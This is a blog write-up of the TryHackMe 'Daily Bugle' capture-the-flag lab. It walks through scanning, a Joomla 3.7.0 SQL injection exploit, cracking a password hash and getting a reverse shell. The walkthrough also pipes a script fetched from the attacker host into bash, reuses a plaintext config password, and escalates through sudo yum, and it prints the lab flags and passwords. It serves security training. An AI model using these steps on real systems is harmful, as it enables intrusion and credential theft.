---
title: TryHackMe - Daily Bugle
description: My writeup on Daily Bugle box.
categories:
 - tryhackme
tags: tryhackme whatweb joomla joomscan searchsploit sqli john linpeas sudo yum bash
---

![](https://i.imgur.com/Ilrzate.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **Daily Bugle**  |
| Difficulty :  | **Hard**             |
| Play :    | [Daily Bugle](https://tryhackme.com/room/dailybugle){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Hello, i don't know why this box rate is "hard" more like easy/medium. It's about exploiting a vulnerable joomla version. First privesc is finding a plaintext password in a config file & privesc to root is about yum. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.94.113
$ nmap -sC -sV -oN nmap/dailybugle.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 14:28 EET
Nmap scan report for 10.10.94.113 (10.10.94.113)
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
```

The website is running joomla, we can detect that using `whatweb` too.

```
$ whatweb http://$ip/ | tee scans/whatweb.txt
http://10.10.94.113/ [200 OK] Apache[2.4.6], Bootstrap, Cookies[eaa83fe8b963ab08ce9ab7d4a798de05], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], IP[10.10.94.113], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/5.6.40]
```

Let's fire up a `joomscan`.

```
$ joomscan --url http://$ip/ | tee scans/joomscan.txt

Processing http://10.10.94.113/ ...           

[+] FireWall Detector                         
[++] Firewall not detected                    

[+] Detecting Joomla Version                  
[++] Joomla 3.7.0                     

...data...
```

We got the version, let's search for possible exploits.

```
$ searchsploit joomla 3.7.0
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                 |  Path
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                     | php/webapps/42033.txt
```

## Shell as www-data

Perfect, i found another exploit on github that does all the job. You can find it [here](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py){:target="_blank"} Let's download it and fire it up!

```
$ python joomblah.py http://$ip/

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Now let's crack the password hash using john. (takes some time)

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
```

Let's login now under `/administrator` and spawn a reverse shell. If you dont know how to spawn a reverse shell check my writeup on [DC3 box](https://0xatom.github.io/vulnhub/2020/12/20/dc3/){:target="_blank"}

```
$ nc -lvp 5555
listening on [any] 5555 ...

sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ whoami;id
apache
uid=48(apache) gid=48(apache) groups=48(apache)
```

## Shell as jjameson

Let's fire up now [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite){:target="_blank"}

Download the script and open a python SimpleHTTPServer.

```
$ python3 -m http.server 80
```

Now transfer the file and pipe it to bash.

```
bash-4.2$ curl http://10.9.234.105/linpeas.sh | bash
```

Looking through the output i detected a password:

```
/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';
```

We can switch to user `jjameson` now.

```
bash-4.2$ su - jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle ~]$ whoami;id
jjameson
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```

## Shell as root

Checking the `sudo -l` as always, we can run `yum` as root.

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Checking the [GTFObins page](https://gtfobins.github.io/gtfobins/yum/#sudo){:target="_blank"} there are lot of commands that we have to write..

![](https://i.imgur.com/wfBAcXi.png)

We will create a shell script in our box with all the commands and transfer it to target box.

![](https://i.imgur.com/2MPtU5D.png)

Let's read the flags.

```
sh-4.2# cat /root/root.txt; cat /home/jjameson/user.txt                                                                                                                          
eec3d53292b1821868266858d7fa6f79                                                                                                                                                 
27a260fe3cba712cfdedb1c86d80442e       
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
